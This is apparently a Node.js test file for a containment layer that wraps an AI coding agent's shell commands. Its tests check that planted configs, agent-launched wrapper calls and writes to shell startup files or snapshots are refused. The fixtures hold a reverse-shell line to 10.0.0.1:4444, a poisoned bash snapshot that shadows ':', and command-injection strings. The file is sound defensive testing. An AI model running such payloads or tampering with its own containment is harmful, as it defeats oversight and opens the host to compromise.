// MXC containment hardening (v1.18.2), the pure parts: an agent-supplied wrapped form is never "recovered" into
// a command the wrap would refuse (cli/containment-enforce.mjs unwrapCommand / commandWrapWhy), an agent's own
// wxc-exec launch is recognised (launchesWxcExec), the plan refuses Monitor, a workspace overlapping agent or
// MoorAI state and a cwd outside the workspace, the display prefix gives the original to no command (checked
// under the real bash with a shadowed `:`), and the write guard (cli/containment-guard.mjs).
// The hook wiring is test/containment-hardening-hook.test.mjs.
//
//   node --test --import ./test/hermetic-env.mjs test/containment-hardening.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { rmTree } from "./fs-cleanup.mjs";
import {
  planWrap, wrapConfig, unwrapCommand, commandWrapWhy, launchesWxcExec, outerCommand, bashQuote, stateDirsOf,
  COMMAND_TOOLS, WRAP_ENV, WRAP_MAX_CHARS, WRAP_OUTER_MAX
} from "../cli/containment-enforce.mjs";
import { guardHit, guardTargets, resolveTarget, guardAlert, GIT_BASH_RC } from "../cli/containment-guard.mjs";

const ENV = {
  USERPROFILE: "C:\\Users\\dev", LOCALAPPDATA: "C:\\Users\\dev\\AppData\\Local", APPDATA: "C:\\Users\\dev\\AppData\\Roaming", ProgramFiles: "C:\\Program Files",
  SystemRoot: "C:\\Windows", ProgramData: "C:\\ProgramData", PATH: "C:\\Windows\\System32;C:\\Program Files\\Microsoft MXC", CLAUDE_PROJECT_DIR: "C:\\src\\proj"
};
const WXC = "C:\\Program Files\\Microsoft MXC\\wxc-exec.exe";
const BASHEXE = "C:\\Program Files\\Git\\bin\\bash.exe";
function memfs() {
  const files = new Map(), dirs = new Set();
  const present = new Set([WXC, BASHEXE, "C:\\src\\proj", "C:\\Program Files\\Git"]);
  const stat = (kind) => ({ isDirectory: () => kind === "dir", isFile: () => kind === "file", isSymbolicLink: () => false, mtimeMs: Date.now() });
  return {
    files,
    exists: (p) => present.has(p) || dirs.has(p) || files.has(p),
    lstat: (p) => { if (dirs.has(p)) return stat("dir"); if (files.has(p)) return stat("file"); const e = new Error("ENOENT"); e.code = "ENOENT"; throw e; },
    mkdir: (p) => { dirs.add(p); },
    write: (p, text) => { files.set(p, { text }); },
    read: (p) => files.get(p).text,
    list: () => [],
    unlink: (p) => files.delete(p)
  };
}
const plan0 = (fs, over = {}) => planWrap({ platform: "win32", tool: "Bash", canRewrite: true, env: ENV, cwd: "C:\\src\\proj\\sub", capable: null, exists: fs.exists, lstat: fs.lstat, mkdir: fs.mkdir, ...over });
// A config planted in the wrap dir by someone other than the hook: its MOORAI_WRAP_CMD is whatever they chose.
function plant(fs, p, value, name = "c") {
  const cfg = `${p.wrapDir}\\wrap-${name.repeat(32)}.json`;
  fs.files.set(cfg, { text: JSON.stringify({ process: { env: [`${WRAP_ENV}=${value}`], commandLine: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" } }) });
  return outerCommand(p.wxc, cfg, "ls");
}

test("unwrapCommand: a planted config whose command the wrap would refuse is unrecoverable (false), never a command", () => {
  const fs = memfs();
  const p = plan0(fs);
  const opts = { wxc: p.wxc, wrapDir: p.wrapDir, read: fs.read, lstat: fs.lstat };
  for (const [label, v] of [["empty", ""], ["blank", "   "], ["nul", "ls\0"], ["too long", "x".repeat(WRAP_MAX_CHARS + 1)], ["command line too long", "echo " + "a".repeat(WRAP_OUTER_MAX)]]) {
    assert.equal(unwrapCommand(plant(fs, p, v), opts), false, label);
  }
  // No MOORAI_WRAP_CMD at all: unrecoverable too.
  const cfg = `${p.wrapDir}\\wrap-${"e".repeat(32)}.json`;
  fs.files.set(cfg, { text: JSON.stringify({ process: { env: ["OTHER=1"] } }) });
  assert.equal(unwrapCommand(outerCommand(p.wxc, cfg, "ls"), opts), false);
  // A planted config with an ordinary command: recovered, and only ever re-wrapped into a fresh config.
  assert.equal(unwrapCommand(plant(fs, p, "npm test", "d"), opts), "npm test");
});

test("commandWrapWhy: the command-only checks wrapConfig makes, by token", () => {
  const p = plan0(memfs());
  assert.equal(commandWrapWhy(p, "ls"), null);
  assert.equal(commandWrapWhy(p, ""), "empty-command");
  assert.equal(commandWrapWhy(p, "a\0b"), "command-nul");
  assert.equal(commandWrapWhy(p, "x".repeat(WRAP_MAX_CHARS + 1)), "command-too-long");
  assert.equal(commandWrapWhy(p, "echo " + "a".repeat(WRAP_OUTER_MAX)), "command-line-too-long");
  assert.equal(wrapConfig(p, "a\0b", { env: ENV, exists: memfs().exists }).why, "command-nul", "wrapConfig uses the same checks");
});

test("launchesWxcExec: any form of the launcher name, quotes and backslashes removed; ordinary commands are not", () => {
  for (const c of [
    "wxc-exec --config x.json", "'C:/Program Files/Microsoft MXC/wxc-exec.exe' --config c.json", "\"C:\\Program Files\\Microsoft MXC\\wxc-exec.exe\" c.json",
    "WXC-EXEC.EXE --probe", "w''xc-exec --config a", "w\"x\"c-exec a", "wxc\\-exec a", "x=$(which wxc-exec); $x --config a", "ls && wxc-exec -- cmd",
    outerCommand(WXC, "C:\\Users\\dev\\AppData\\Local\\MoorAI Host\\wrap\\wrap-" + "a".repeat(32) + ".json", "ls")
  ]) assert.equal(launchesWxcExec(c), true, c);
  for (const c of ["ls -la", "npm test", "echo wxc exec", "", "cat mxc-config.json"]) assert.equal(launchesWxcExec(c), false, c);
  assert.equal(launchesWxcExec(undefined), false);
});

test("planWrap: Monitor is never wrapped; a workspace overlapping agent or MoorAI state is refused; a cwd outside the workspace is refused", () => {
  assert.ok(COMMAND_TOOLS.includes("Monitor"));
  assert.equal(plan0(memfs(), { tool: "Monitor" }).why, "monitor-tool");
  for (const ws of ["C:\\Users\\dev\\.claude", "C:\\Users\\dev\\.claude\\projects\\x", "C:\\Users\\dev\\.moorai", "C:\\Users\\dev\\AppData\\Roaming\\MoorAI", "C:\\Users\\dev\\AppData\\Local\\MoorAI", "C:\\Users\\dev\\AppData\\Local\\MoorAI Host", "C:\\ProgramData\\MoorAI", "C:\\Users\\dev", "C:\\Users\\dev\\AppData"]) {
    assert.equal(plan0(memfs(), { env: { ...ENV, CLAUDE_PROJECT_DIR: ws }, cwd: ws }).why, "workspace-overlaps-state", ws);
  }
  // CLAUDE_CONFIG_DIR moves ~/.claude: that is the state to keep out of the workspace.
  assert.equal(plan0(memfs(), { env: { ...ENV, CLAUDE_CONFIG_DIR: "C:\\src\\proj\\.cc" } }).why, "workspace-overlaps-state");
  assert.ok(stateDirsOf({ ...ENV, CLAUDE_CONFIG_DIR: "D:\\cc" }).includes("D:\\cc"));
  assert.equal(plan0(memfs(), { cwd: "C:\\elsewhere" }).why, "cwd-outside-workspace");
  assert.equal(plan0(memfs(), { cwd: "C:\\src\\project2" }).why, "cwd-outside-workspace", "a sibling with a shared prefix is outside");
  assert.equal(plan0(memfs(), { cwd: "C:\\src\\proj" }).ok, true);
  assert.equal(plan0(memfs(), { cwd: "c:\\SRC\\proj\\deep\\er" }).ok, true, "case-insensitive");
});

// Git for Windows ships bash 5.x; prefer a bash 5 here.
const BASH = ["/opt/homebrew/bin/bash", "/usr/local/bin/bash", "/usr/bin/bash", "/bin/bash"].find((p) => spawnSync(p, ["-c", "true"]).status === 0);
test("display prefix under the real bash: a shell snapshot that shadows `:` (or anything else) never receives the original", { skip: !BASH && "no bash" }, (t) => {
  const dir = mkdtempSync(join(tmpdir(), "moorai-ch-show-"));
  t.after(() => rmTree(dir));
  // A stand-in for wxc-exec: records its argv and whether the display variable reached its environment.
  const stub = join(dir, "wxc-stub.sh");
  writeFileSync(stub, `#!${BASH}\nprintf '%s\\n' "show=\${__moorai_show-unset}" "$@" >> "${join(dir, "calls.log")}"\nexit 7\n`, { mode: 0o755 });
  const cfg = "C:\\Users\\dev\\AppData\\Local\\MoorAI Host\\wrap\\wrap-" + "a".repeat(32) + ".json";
  // What a poisoned snapshot can define: a `:` function, an alias for each word, a function named like the variable.
  const snapshot = [
    ":() { eval \"$1\"; }", "__moorai_show() { eval \"$1\"; }", "MSYS_NO_PATHCONV() { eval \"$1\"; }",
    "shopt -s expand_aliases", "alias __moorai_show='touch PWNED;'", "alias MSYS_NO_PATHCONV='touch PWNED;'"
  ].join("\n");
  const env = { PATH: process.env.PATH, HOME: dir };
  for (const orig of ["touch PWNED", "x'; touch PWNED; '", "$(touch PWNED)"]) {
    writeFileSync(join(dir, "calls.log"), "");
    const script = `${snapshot}\neval ${bashQuote(outerCommand(stub, cfg, orig))}`;
    const r = spawnSync(BASH, ["--noprofile", "--norc", "-c", script], { cwd: dir, env, encoding: "utf8" });
    assert.equal(existsSync(join(dir, "PWNED")), false, `${JSON.stringify(orig)} ran: ${r.stderr}`);
    assert.equal(r.status, 7, r.stderr);
    assert.deepEqual(readFileSync(join(dir, "calls.log"), "utf8").split("\n").filter(Boolean), ["show=unset", "--config", cfg], "the original is not exported to the launch");
  }
  // Control: the v1.18.0/1 prefix (`: '<original>' ;`) hands the original to a shadowed `:`, which runs it.
  const legacy = `${snapshot}\neval ${bashQuote(`: ${bashQuote("touch PWNED")} ; MSYS_NO_PATHCONV=1 ${bashQuote(stub)} --config ${bashQuote(cfg)}`)}`;
  spawnSync(BASH, ["--noprofile", "--norc", "-c", legacy], { cwd: dir, env, encoding: "utf8" });
  assert.equal(existsSync(join(dir, "PWNED")), true, "the control shows why the prefix changed");
});

// ---- the write guard ----
test("resolveTarget: ~, $HOME, ${VAR}, %VAR%, $env:VAR, MSYS /c/ paths, relative paths and .. all land on the Windows path", () => {
  const o = { env: ENV, cwd: "C:\\src\\proj" };
  for (const p of ["~/.bashrc", "$HOME/.bashrc", "${USERPROFILE}/.bashrc", "%USERPROFILE%\\.bashrc", "$env:USERPROFILE\\.bashrc", "/c/Users/dev/.bashrc", "/cygdrive/c/Users/dev/.bashrc", "C:/Users/dev/.bashrc", "\"C:\\Users\\dev\\.bashrc\"", "../../Users/dev/.bashrc", "C:\\src\\proj\\..\\..\\Users\\dev\\x\\..\\.bashrc"]) {
    assert.equal(resolveTarget(p, o).toLowerCase(), "c:\\users\\dev\\.bashrc", p);
  }
  assert.equal(resolveTarget("rel/x", o), "C:\\src\\proj\\rel\\x");
  assert.equal(resolveTarget("rel/x", { env: ENV, cwd: "" }), "", "no absolute cwd: unknown");
  assert.equal(resolveTarget("$CLAUDE_CONFIG_DIR/x", o), "", "an unset variable: unknown");
});

test("guardTargets: MoorAI Host, the shell snapshots (CLAUDE_CONFIG_DIR-aware), the Git Bash startup files", () => {
  const t = guardTargets(ENV);
  const paths = t.map((x) => `${x.cls}:${x.path}`);
  assert.ok(paths.includes("moorai-host:C:\\Users\\dev\\AppData\\Local\\MoorAI Host"));
  assert.ok(paths.includes("shell-snapshots:C:\\Users\\dev\\.claude\\shell-snapshots"));
  for (const f of GIT_BASH_RC) assert.ok(paths.includes(`shell-rc:C:\\Users\\dev\\${f}`), f);
  assert.ok(paths.includes("shell-rc:C:\\Program Files\\Git\\etc\\bash.bashrc"));
  assert.ok(guardTargets({ ...ENV, CLAUDE_CONFIG_DIR: "D:\\cc" }).some((x) => x.path === "D:\\cc\\shell-snapshots"));
  assert.deepEqual(guardTargets({}), []);
});

test("guardHit: Write/Edit/MultiEdit/NotebookEdit into a protected location, and shell writes naming one", () => {
  const g = (tool, ti) => guardHit({ tool, ti, env: ENV, cwd: "C:\\src\\proj" });
  assert.equal(g("Write", { file_path: "C:\\Users\\dev\\AppData\\Local\\MoorAI Host\\wrap\\wrap-" + "a".repeat(32) + ".json" }), "moorai-host");
  assert.equal(g("Edit", { file_path: "C:/Users/dev/.claude/shell-snapshots/snapshot-bash-1.sh" }), "shell-snapshots");
  assert.equal(g("MultiEdit", { file_path: "~/.bash_profile" }), "shell-rc");
  assert.equal(g("NotebookEdit", { notebook_path: "C:\\Users\\dev\\.profile" }), "shell-rc");
  assert.equal(g("Write", { file_path: "C:\\Program Files\\Git\\etc\\profile.d\\x.sh" }), "shell-rc");
  for (const [cmd, cls] of [
    ["echo 'f(){ :; }' >> ~/.bashrc", "shell-rc"], ["printf x >>/c/Users/dev/.bash_profile", "shell-rc"], ["cp evil.sh $HOME/.profile", "shell-rc"],
    ["tee -a \"C:\\Users\\dev\\.bashrc\" < x", "shell-rc"], ["cd ~ && echo x >> .bashrc", "shell-rc"], ["dd if=x of=~/.bash_login", "shell-rc"],
    ["sed -i s/a/b/ \"$LOCALAPPDATA/MoorAI Host/wrap/wrap-1.json\"", "moorai-host"], ["echo {} > 'C:/Users/dev/AppData/Local/MoorAI Host/wrap/x.json'", "moorai-host"],
    ["python -c \"open(r'C:\\Users\\dev\\AppData\\Local\\MoorAI Host\\wrap\\x.json','w')\"", "moorai-host"],
    ["echo 'trap x DEBUG' >> ~/.claude/shell-snapshots/snapshot-bash-1.sh", "shell-snapshots"],
    ["Set-Content -Path $env:USERPROFILE\\.bashrc -Value x", "shell-rc"]
  ]) assert.equal(g("Bash", { command: cmd }), cls, cmd);
  assert.equal(g("Monitor", { command: "echo x >> ~/.bashrc" }), "shell-rc");
  assert.equal(g("PowerShell", { command: "Add-Content -Path ~/.bashrc -Value x" }), "shell-rc");
  // Reads, and writes elsewhere, are not the guard's.
  for (const cmd of ["cat ~/.bashrc", "source ~/.bashrc", "grep alias ~/.bash_profile", "echo x >> notes/.bashrc.md", "echo x >> ./project.profile", "ls ~/.claude/shell-snapshots", "npm test > out.log"]) {
    assert.equal(g("Bash", { command: cmd }), null, cmd);
  }
  assert.equal(g("Write", { file_path: "C:\\src\\proj\\.bashrc" }), null, "a project file with an rc name");
  assert.equal(g("Write", { file_path: "src/app.js" }), null);
  assert.equal(g("Read", { file_path: "~/.bashrc" }), null);
  assert.equal(g("Monitor", { ws: { url: "wss://x.example" } }), null);
});

test("guardAlert is content-free: the class, never the path", () => {
  const a = guardAlert({ tool: "Write", cls: "shell-rc" });
  assert.equal(a.category, "Containment: write to a protected location");
  assert.equal(a.guardClass, "shell-rc");
  assert.ok(!/Users|bashrc/.test(JSON.stringify(a)));
});
